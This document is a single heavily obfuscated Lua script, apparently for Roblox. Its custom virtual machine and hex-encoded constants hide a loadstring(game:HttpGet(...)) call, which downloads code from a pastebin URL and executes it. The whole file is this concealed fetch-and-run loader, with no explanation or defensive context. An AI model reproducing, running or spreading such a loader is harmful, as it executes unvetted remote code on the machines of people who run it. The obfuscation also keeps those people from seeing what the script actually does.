local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v79=v2(v0(v30,16));if v19 then local v89=v5(v79,v19);v19=nil;return v89;else return v79;end end end);local function v20(v31,v32,v33) if v33 then local v80=0 -(0 + 0) ;local v81;while true do if (v80==(0 -0)) then v81=(v31/(2^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v81-(v81%(928 -(214 + 713))) ;end end else local v82=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v82 + v82))>=v82) and (878 -(282 + 595))) or ((2333 -696) -(1523 + (1179 -(68 + 997)))) ;end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==(1271 -(226 + 1044))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (118 -((989 -(892 + 65)) + 85)) ;v34=1 + 0 ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (4 -2) );v18=v18 + (3 -1) ;return (v37 * (469 -213)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -(87 + 263)) );v18=v18 + 3 + 1 ;return (v41 * (16777396 -(67 + 113))) + (v40 * (48056 + 17480)) + (v39 * (628 -372)) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=(11 -8) -2 ;local v45=(v20(v43,953 -((1244 -(416 + 26)) + 150) ,20) * ((5 -3)^(57 -25))) + v42 ;local v46=v20(v43,16 + (15 -10) ,1028 -(915 + 82) );local v47=((v20(v43,(39 + 51) -(102 -44) )==(1 + 0)) and  -((439 -(145 + 293)) -0)) or (1188 -(1069 + 118)) ;if (v46==0) then if (v45==0) then return v47 * 0 ;else local v90=0 -0 ;while true do if (v90==(0 -(430 -(44 + 386)))) then v46=1;v44=0 + 0 ;break;end end end elseif (v46==(3636 -(3075 -(998 + 488)))) then return ((v45==0) and (v47 * ((1 + 0)/(791 -(368 + 423))))) or (v47 * NaN) ;end return v8(v47,v46-(3214 -2191) ) * (v44 + (v45/((20 -(10 + 8))^(17 + 35)))) ;end local function v25(v48) local v49=(859 -(814 + 45)) + 0 ;local v50;local v51;while true do if (v49==1) then v50=v3(v16,v18,(v18 + v48) -(773 -(201 + 571)) );v18=v18 + v48 ;v49=1140 -(116 + 1022) ;end if (v49==(8 -6)) then v51={};for v91=2 -1 , #v50 do v51[v91]=v2(v1(v3(v50,v91,v91)));end v49=2 + 1 ;end if ((0 -0)==v49) then v50=nil;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=1;end if (v49==(10 -7)) then return v6(v51);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do if (v52== #",") then local v85=(function() return 0;end)();local v86=(function() return;end)();while true do if (v85==0) then v86=(function() return 1767 -(308 + 1459) ;end)();while true do if (v86~=0) then else v57=(function() return v23();end)();v58=(function() return {};end)();v86=(function() return 1;end)();end if ((1 -0)==v86) then for v111= #"|",v57 do local v112=(function() return 0 -0 ;end)();local v113=(function() return;end)();local v114=(function() return;end)();local v115=(function() return;end)();while true do if (v112~=0) then else v113=(function() return 0;end)();v114=(function() return nil;end)();v112=(function() return 1;end)();end if (v112~=(3 -2)) then else v115=(function() return nil;end)();while true do if (v113==(868 -(550 + 317))) then if (v114== #"\\") then v115=(function() return v21()~=(0 -0) ;end)();elseif (v114==(2 -0)) then v115=(function() return v24();end)();elseif (v114~= #"91(") then else v115=(function() return v25();end)();end v58[v111]=(function() return v115;end)();break;end if (v113~=0) then else local v167=(function() return 0 -0 ;end)();local v168=(function() return;end)();while true do if (v167==(285 -(134 + 151))) then v168=(function() return 0;end)();while true do if (v168==(1665 -(970 + 695))) then v114=(function() return v21();end)();v115=(function() return nil;end)();v168=(function() return 1;end)();end if (v168~=1) then else v113=(function() return 1;end)();break;end end break;end end end end break;end end end v56[ #"asd"]=(function() return v21();end)();v86=(function() return 2;end)();end if (v86~=(3 -1)) then else v52=(function() return 1992 -(582 + 1408) ;end)();break;end end break;end end end if ((6 -4)~=v52) then else for v93= #",",v23() do local v94=(function() return v21();end)();if (v20(v94, #"~", #"}")==0) then local v103=(function() return 0 -0 ;end)();local v104=(function() return;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();while true do if ((0 -0)==v103) then local v109=(function() return 0;end)();while true do if (v109~=(1825 -(1195 + 629))) then else v103=(function() return 1;end)();break;end if (v109==0) then v104=(function() return 0;end)();v105=(function() return nil;end)();v109=(function() return 1;end)();end end end if (v103==1) then local v110=(function() return 0;end)();while true do if (v110==0) then v106=(function() return nil;end)();v107=(function() return nil;end)();v110=(function() return 1 -0 ;end)();end if (v110~=(242 -(187 + 54))) then else v103=(function() return 2;end)();break;end end end if (v103==(782 -(162 + 618))) then while true do if (v104==(2 + 0)) then local v147=(function() return 0 + 0 ;end)();local v148=(function() return;end)();while true do if (v147==0) then v148=(function() return 0 -0 ;end)();while true do if (v148==(0 -0)) then if (v20(v106, #"~", #".")~= #"~") then else v107[1 + 1 ]=(function() return v58[v107[1638 -(1373 + 263) ]];end)();end if (v20(v106,2,2)== #"!") then v107[ #"xnx"]=(function() return v58[v107[ #"-19"]];end)();end v148=(function() return 1001 -(451 + 549) ;end)();end if (v148==1) then v104=(function() return  #"asd";end)();break;end end break;end end end if (v104~= #"[") then else local v149=(function() return 0 + 0 ;end)();local v150=(function() return;end)();while true do if (v149~=0) then else v150=(function() return 0;end)();while true do if (v150~=0) then else v107=(function() return {v22(),v22(),nil,nil};end)();if (v105==0) then local v171=(function() return 0;end)();local v172=(function() return;end)();while true do if (v171==(0 -0)) then v172=(function() return 0 -0 ;end)();while true do if (0~=v172) then else v107[ #"xxx"]=(function() return v22();end)();v107[ #"xnxx"]=(function() return v22();end)();break;end end break;end end elseif (v105== #"}") then v107[ #"19("]=(function() return v23();end)();elseif (v105==2) then v107[ #"19("]=(function() return v23() -((1386 -(746 + 638))^16) ;end)();elseif (v105== #"-19") then local v177=(function() return 0;end)();local v178=(function() return;end)();while true do if (v177==(0 + 0)) then v178=(function() return 0 -0 ;end)();while true do if (v178~=(341 -(218 + 123))) then else v107[ #"xxx"]=(function() return v23() -(2^(1597 -(1535 + 46))) ;end)();v107[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v150=(function() return 1 + 0 ;end)();end if (1==v150) then v104=(function() return 1 + 1 ;end)();break;end end break;end end end if (v104~=(560 -(306 + 254))) then else local v151=(function() return 0 + 0 ;end)();local v152=(function() return;end)();while true do if (v151==0) then v152=(function() return 0;end)();while true do if (v152==(1 -0)) then v104=(function() return  #",";end)();break;end if (v152~=0) then else v105=(function() return v20(v94,2, #"19(");end)();v106=(function() return v20(v94, #"0836",6);end)();v152=(function() return 1;end)();end end break;end end end if (v104== #"xnx") then if (v20(v106, #"nil", #"19(")~= #",") then else v107[ #".com"]=(function() return v58[v107[ #"0313"]];end)();end v53[v93]=(function() return v107;end)();break;end end break;end end end end for v95= #"|",v23() do v54[v95-#":" ]=(function() return v28();end)();end return v56;end if (v52==0) then local v87=(function() return 0;end)();local v88=(function() return;end)();while true do if ((1467 -(899 + 568))==v87) then v88=(function() return 0;end)();while true do if ((0 + 0)==v88) then v53=(function() return {};end)();v54=(function() return {};end)();v88=(function() return 2 -1 ;end)();end if (v88~=(604 -(268 + 335))) then else v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v88=(function() return 2;end)();end if (v88~=2) then else v52=(function() return  #"\\";end)();break;end end break;end end end end end local function v29(v59,v60,v61) local v62=v59[1];local v63=v59[574 -(426 + 146) ];local v64=v59[1 + 2 ];return function(...) local v65=v62;local v66=v63;local v67=v64;local v68=v27;local v69=(330 + 1127) -((695 -(15 + 398)) + 1174) ;local v70= -(812 -((1551 -(18 + 964)) + 242));local v71={};local v72={...};local v73=v12("#",...) -1 ;local v74={};local v75={};for v83=0 -0 ,v73 do if (((1432<3555) and (v83>=v67)) or (4795<1407)) then v71[v83-v67 ]=v72[v83 + 1 + 0 ];else v75[v83]=v72[v83 + ((3858 -2833) -(706 + 318)) ];end end local v76=(v73-v67) + (1252 -(721 + 307 + 223)) ;local v77;local v78;while true do local v84=1271 -(945 + 326) ;while true do if (v84==(0 -0)) then v77=v65[v69];v78=v77[1 + 0 ];v84=1 + 0 ;end if (v84==(701 -((1121 -(20 + 830)) + 429))) then if ((1853<4813) and (v78<=(3 + 0))) then if (v78<=(1501 -(1408 + 92))) then if ((v78>(1086 -(461 + 625))) or (2821<2431)) then v75[v77[1290 -(993 + 295) ]]=v61[v77[3]];else local v118;local v119,v120;local v121;local v122;v75[v77[1 + 1 ]]=v61[v77[3]];v69=v69 + (1172 -(418 + 753)) ;v77=v65[v69];v75[v77[1 + 1 ]]=v61[v77[1 + 2 ]];v69=v69 + 1 ;v77=v65[v69];v122=v77[1 + 1 ];v121=v75[v77[3]];v75[v122 + 1 + 0 ]=v121;v75[v122]=v121[v77[533 -(317 + 89 + 123) ]];v69=v69 + (1770 -(1749 + 20)) ;v77=v65[v69];v75[v77[1 + (127 -(116 + 10)) ]]=v77[3];v69=v69 + 1 ;v77=v65[v69];v122=v77[1324 -(93 + 1156 + 73) ];v119,v120=v68(v75[v122](v13(v75,v122 + 1 + 0 ,v77[1148 -(466 + 679) ])));v70=(v120 + v122) -1 ;v118=0;for v154=v122,v70 do v118=v118 + (2 -1) ;v75[v154]=v119[v118];end v69=v69 + ((740 -(542 + 196)) -1) ;v77=v65[v69];v122=v77[1902 -(106 + 1794) ];v75[v122]=v75[v122](v13(v75,v122 + (1 -0) + 0 ,v70));v69=v69 + 1 + 0 ;v77=v65[v69];v75[v77[2]]();v69=v69 + (2 -1) ;v77=v65[v69];do return;end end elseif ((v78>(5 -3)) or (2874<2181)) then v75[v77[116 -(2 + 2 + 110) ]]=v77[587 -(57 + 527) ];else local v138=1427 -(41 + 1386) ;local v139;local v140;while true do if ((103 -(17 + 86))==v138) then v139=v77[2 + 0 ];v140=v75[v77[6 -3 ]];v138=2 -1 ;end if (v138==(167 -(122 + 44))) then v75[v139 + (1 -0) ]=v140;v75[v139]=v140[v77[(7 + 5) -8 ]];break;end end end elseif (v78<=(5 + 0)) then if (v78==(1 + 3)) then do return;end else v75[v77[2]]();end elseif ((v78==(11 -5)) or (1065>3578)) then local v141=v77[2];v75[v141]=v75[v141](v13(v75,v141 + (66 -(30 + 35)) ,v70));else local v143=v77[2 + 0 ];local v144,v145=v68(v75[v143](v13(v75,v143 + (1258 -(1043 + 214)) ,v77[11 -8 ])));v70=(v145 + v143) -(1213 -(323 + 889)) ;local v146=(0 + 0) -0 ;for v157=v143,v70 do v146=v146 + ((1530 -949) -(361 + 219)) ;v75[v157]=v144[v146];end end v69=v69 + ((822 -501) -((1604 -(1126 + 425)) + 267)) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F396964616951465400083O00124O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);
